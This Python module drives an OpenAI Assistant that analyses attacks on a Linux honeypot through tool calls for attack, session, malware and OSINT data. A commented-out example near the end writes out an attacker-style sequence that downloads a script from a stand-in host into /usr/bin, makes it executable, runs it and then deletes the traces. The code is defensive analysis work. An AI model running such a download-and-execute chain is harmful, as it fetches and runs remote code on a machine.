from analyzerbase import *
from .aibase import *
from typing import Union
from osintanalyzers.ipanalyzer import IPAnalyzer
from osintanalyzers.malwareanalyzer import MalwareAnalyzer


class ToolCallLog:
    """Class for storing tool calls to be used in a markdown file later
    NOT IMPLEMENTED YET
    """

    def __init__(self, ass_id, thread_id, run_id, prompt=""):
        self.ass_id = ass_id
        self.thread_id = thread_id
        self.run_id = run_id
        self.prompt = prompt

        self.log = []

    def add_tool_call(self, tool_call_id, tool_name, arguments, tool_output):
        self.log.append({
            "tool_call_id": tool_call_id,
            "tool_name": tool_name,
            "tool_args": arguments,
            "tool_output": tool_output
        })




class OpenAIAssistantAnalyzer(OpenAIAnalyzerBase):
    """OpenAIAnalyzer based on Assistant API using GPT functions/tool_calls to update thread context window"""
    
    def __init__(self, training_data_dir=Path("openai-training-data"), 
                 aidb_path=Path("tests/aidb"), 
                 api_key=OPENAI_API_KEY, 
                 model="gpt-4-1106-preview",
                 ipanalyzer= IPAnalyzer(),
                 malwareanalyzer= MalwareAnalyzer(),
                 
                 ) -> None:
        super().__init__(training_data_dir, aidb_path, api_key, model)

        # Make dir to store data for assistants    
        self.ai_assistants_dir = self.training_data_dir / "assistants"
        if not self.ai_assistants_dir.exists():
            self.ai_assistants_dir.mkdir(exist_ok=True, parents=True)
        

        # To store Assistants, Threads, Runs, and Message Objects by id
        self.ai_assistants = {}
        self.ai_threads = {}
        self.ai_messages = {}
        self.ai_runs = {}

        # To store tool call logs (NOT IMPLEMENTED YET)
        self.tool_call_logs = {}
        self.current_tool_call_log = None

        # To handle tool calls (See _do_tool_call and tools.py)
        self.ipanalyzer = ipanalyzer
        self.malwareanalyzer = malwareanalyzer

    
    def create_assistant(self, **kwargs):
        """Creates an assistant and stores it in ai_assistants dict and ai_assistants_dir/assistant_ids.txt"""

        assistant = self.client.beta.assistants.create(
            model = kwargs.pop("model") or self.model,
            **kwargs,
        )
        
        with (self.ai_assistants_dir / "assistant_ids.txt").open("a+") as f:
            f.write(assistant.id + '\n')
        
        self.ai_assistants[assistant.id] = assistant
        return assistant
    

    def create_thread(self):
        """Creates a thread and stores it in ai_threads dict and ai_assistants_dir/thread_ids.txt"""

        thread = self.client.beta.threads.create()
        
        with (self.ai_assistants_dir / "thread_ids.txt").open("a+") as f:
            f.write(thread.id + '\n')


        self.ai_threads[thread.id] = thread
        return thread
    
    

    def create_run(self, ass_id, thread_id, **kwargs):
        """Creates a run and stores it in ai_runs dict and ai_assistants_dir/run_ids.txt"""
        
        run = self.client.beta.threads.runs.create(
                assistant_id=ass_id,
                thread_id=thread_id,
                **kwargs
        )

        with (self.ai_assistants_dir / "run_ids.txt").open("a+") as f:
            f.write(run.id + '\n')
        
        self.ai_runs[run.id] = run
        return run
    


    def get_assistant(self, ass_id):
        """Gets assistant from self or openai client if not retrieved yet"""
        assistant = self.ai_assistants.get(ass_id)
        
        if not assistant:
            assistant = self.client.beta.assistants.retrieve(ass_id)
            self.ai_assistants[assistant.id] = assistant

        return assistant


    def get_thread(self, thread_id):
        """Gets thread from self or openai client if not retrieved yet"""
        thread = self.ai_threads.get(thread_id)
        
        if not thread:
            thread = self.client.beta.threads.retrieve(thread_id)
            self.ai_threads[thread_id] = thread

        return thread


    def update_assistant(self, ass_id, **kwargs):
        """Updates Assistant system_prompt/instructions and/or functions/tools"""
        assistant = self.client.beta.assistants.update(
                        ass_id, **kwargs)

        return assistant
    

    
    def add_message_to_thread(self, content, thread_id):
        """Add content to therad as user message"""

        role = "user"
        message = self.client.beta.threads.messages.create(
            thread_id=thread_id,
            content=content,
            role=role
            
            )
        return message
    



    def wait_for_response(self, thread_id, run_id, attack, sleep_interval=5, **kwargs):
        """
        Waits for a response and handles status updates. 
        Calls handle_submit_tool_outputs_required to submit tool outputs when run requires action.
        Returns messages once recursive loop is complete. 
        """
        run = None
        while not run or run.status in ("queued", "in_progress"):
            run = self.client.beta.threads.runs.retrieve(
                        thread_id=thread_id,
                        run_id=run_id
                        )
            
            print(f"Status: {run.status} Thread id: {thread_id}, run_id: {run_id}")

            if run.status == "requires_action":
                return self.handle_submit_tool_outputs_required(run, attack, sleep_interval, **kwargs)

            elif run.status in ("cancelled", 'failed', 'expired'):
                raise Exception(f"Run status: {run.status}")
            
            elif run.status == "completed":
                break

            else:
                print(f"Waiting {sleep_interval} seconds for response")
                sleep(sleep_interval)
        
        return self.client.beta.threads.messages.list(thread_id)
        
    


    def handle_submit_tool_outputs_required(self, run, attack, sleep_interval=5, **kwargs):
        """Preforms tool calls and submits tool outputs to run."""

        tool_outputs=[]
        for tool_call in run.required_action.submit_tool_outputs.tool_calls:
            tool_name = tool_call.function.name
            arguments = json.loads(tool_call.function.arguments)

            print(f'\nAI called tool: {tool_name}\nwith args: {arguments}')
            # Get tool output with _do_tool_call
            tool_output = self._do_tool_call(tool_name, arguments, attack, **kwargs)
            print(f'\nReturning tool output: {tool_output}')

            tool_outputs.append({
                "tool_call_id": tool_call.id,
                "output":  self.format_content(tool_output)
            })


        run = self.client.beta.threads.runs.submit_tool_outputs(
                thread_id=run.thread_id,
                run_id=run.id,
                tool_outputs=tool_outputs
                )
        

        return self.wait_for_response(run.thread_id, run.id, attack, sleep_interval, **kwargs)
    


    def _do_tool_call(self, tool_name, arguments, attack, **kwargs):
        """Calls tool and returns output"""

        tool_output = {}
        
        # Sets tool_output to dict of {attr: attack.<attr>} for each attr in arguments["attrs"]         
        if tool_name == "get_attack_attrs":
            tool_output = {
                attr: getattr(attack, attr) for attr in arguments["attrs"]
            }
        
        # Get Session object by id and sets tool_output to dict of {attr: session.<attr>} for each attr in arguments["attrs"]
        elif tool_name == "get_session_attrs":
            session = attack.get_session_by_id(arguments['session_id'])
            tool_output = {
                attr: getattr(session, attr) for attr in arguments["attrs"]
            }

        # Gets Malware object by id and sets tool_output to dict of {attr: malware.<attr>} for each attr in arguments["attrs"]
        elif tool_name == "get_malware_attrs":
            malware = attack.get_malware_by_id(arguments['malware_id'])
            tool_output = {
                attr: getattr(malware, attr) for attr in arguments["attrs"]
            }

        # Sets tool_output to reduced ipdata from sources in arguments["sources"] for each ip in arguments["ips"] 
        elif tool_name == "query_ip_data":
            # Uses IPAnalyzer to get data for ips from sources
            tool_output = self.ipanalyzer.get_attack_data_for_ips(
                attack,
                arguments["ips"],
                arguments["sources"]
            )
        
        # Sets tool_output to reduced iocdata from sources in arguments["sources"] for each ioc in arguments["iocs"]
        elif tool_name == "query_ioc_data":
            # Uses MalwareAnalyzer to get data for iocs from sources
            tool_output = self.malwareanalyzer.get_reduced_data(
                arguments["iocs"],
                arguments["ioc_type"],
                arguments["sources"]
            )

        # Sets tool_output Malpedia result for malware with malpedia_name 
        elif tool_name == "query_malpedia":
            # Uses MalwareAnalyzer to get Malpedia data for malware with malpedia_name
            tool_output = self.malwareanalyzer.get_reduced_data(
                [arguments.get("malpedia_name", arguments).get("malware_name", "error"), ],
                "malpedia_name",
                ["malpedia"]
            )


        return tool_output




    def run_with_assistant(self, 
                           content, 
                           ass_id=None, 
                           thread_id=None, 
                           system_prompt=None, 
                           tools=[], 
                           prepend_content=[], 
                           attack=None,
                           sleep_interval=5,
                           **kwargs                   
                           ):
        
        """Runs prompt with Assistant, handles tool_calls and returns Assistant, Thread, Run, Messages"""

        # Get or create Assistant and Thread
        ass = self.get_assistant(ass_id) if ass_id else self.create_assistant()
        thread = self.get_thread(thread_id) if thread_id else self.create_thread()

        # To determine if Assitant needs to be updated when system_prompt or tools have changed
        update_kwargs = {}
        # Check if system_prompt/instructions have changed
        if system_prompt != ass.instructions:
            update_kwargs.update({"instructions": system_prompt})
        
        # Check for different tool_names
        if [tool["function"]["name"] for tool in tools] != [tool.function.name for tool in ass.tools]:
            update_kwargs.update({"tools": tools})
        
        # Update assitant if any update kwargs are present
        if update_kwargs:
            ass = self.update_assistant(ass_id, **update_kwargs)
        
        # Optionally prepend additional messages before content 
        for precontent in prepend_content:
            self.add_message_to_thread(precontent, thread.id)

        # Add content to thread as message
        self.add_message_to_thread(content, thread.id)

        # Create a run
        run = self.create_run(ass.id, thread.id, **kwargs)
        # Wait for messages after handling tool_calls
        messages = self.wait_for_response(thread.id, run.id, attack, sleep_interval, **kwargs)


        print("done")
        return ass, thread, run, messages 



    def ass_answer_questions(self, questions, attack: Attack):
        
        system_prompt = ''.join([
        "Your role is to answer questions about an attack on a Linux honeypot. "
        "You will analyze the commands executed, uploaded/downloaded files, and logs from the honeypot that contain any of the attacking IP(s), " 
        "and OSINT data gathered about the attacking IP(s) including: geolocation, open ports, running services, "
        "threatfeed reports and previous reports of known malware associated with the IP(s). "
        "Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. "
        "Use the available functions to request relevant information to thoroughly answer each question. "
        "For example if you see that the attacker downloaded malware in the commands, "
        "you should use the get_attack_attrs function with the arguement 'uniq_malware' to get a list of malware_ids associated with the attack, "
        "then use get_malware_attrs and the query_ functions analyze the malware."
        "When getting attrs, always use the uniq_ modifier first when available to get unique values and only get all values if necessary after analyzing the unique values. "
        ])
        

        # Function schemas for Assistant tool_calls. See tools.py
        tools = TOOLS

        # To store {question: answer...}
        question_answers = {}

        #TODO dynamically load assitant and thread ids for Attacks
        ass_id = "asst_R5O9vhLKONwNlqmmxbMYugLo"
        thread_id = None

        # Make a dir to store answers to questions for Attack
        attack_questions_dir = self.ai_assistants_dir / attack.attack_id
        attack_questions_dir.mkdir(exist_ok=True)

        # Get answer for each question
        for question in questions:

            # Filename for answer is hash of question concat with attack_id
            attack_qa_hash = sha256hex(question + attack.attack_id)
            question_answer_file = attack_questions_dir / attack_qa_hash
            
            # Prevent calling same question on an attack if answer file exists
            if question_answer_file.exists():
                with question_answer_file.open("r") as f:
                    question_answer = json.load(f)
                    question_answers.update(question_answer)
                    continue

            
            print(f"\n\nAsking: {question}")
            
            # Run with assistant with question as content
            ass, thread, run, messages = self.run_with_assistant(
                content=question,
                ass_id=ass_id,
                thread_id=thread_id,
                system_prompt=system_prompt,
                tools=tools,
                #prepend_content=prepend_content,
                attack=attack,
                )
            
            # Assign values if Assitant or thread was newly created
            ass_id = ass.id
            thread_id = thread.id            
            
            # Answer is latest message in Thread
            answer = messages.data[0].content[0].text.value

            # Add answers to dict of {question: answer}
            question_answers[question] = answer
            
            # Store for later
            with question_answer_file.open("w+") as f:
                json.dump({question: answer}, f)

            print(f"\n Done with: {question}\nAnswer: {answer}")

        return question_answers




















if __name__ == "__main__":

    pass
    # example_commands1 = ["wget http://example.com -O /usr/bin/example.sh", 
    #                          "cd /usr/bin;chmod +x example.sh", 
    #                          "./example.sh >> example_output.py", 
    #                          "exec example_output.py || python3 example_output.py &",
    #                          "ps -ajfx | grep example_output.py", 
    #                          "rm example.sh",  "rm example_output.py", "exit"]
    

    # ass_analyzer = OpenAIAssistantAnalyzer()
    


























